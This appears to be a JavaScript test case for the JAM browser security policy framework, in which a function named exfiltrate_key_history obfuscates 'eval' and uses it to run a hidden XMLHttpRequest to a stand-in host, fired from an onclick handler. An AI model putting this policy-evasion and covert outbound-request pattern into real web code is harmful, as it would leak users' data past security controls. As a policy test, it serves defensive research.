function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval2", true);xmlhttp.send(null);';
  var v2 = "ev" + "al";
  if (JAM.isEval(eval)) {
    var v0 = eval("introspect(JAM.policy.pFull) { " + v2 + " }")
  } else {
    var v0 = JAM.call(eval, null, [v2])
  }
  JAM.call(v0, null, [exp]);
  return;
}
var v1 = document.getElementById("test");
JAM.set(v1, "onclick", exfiltrate_key_history)
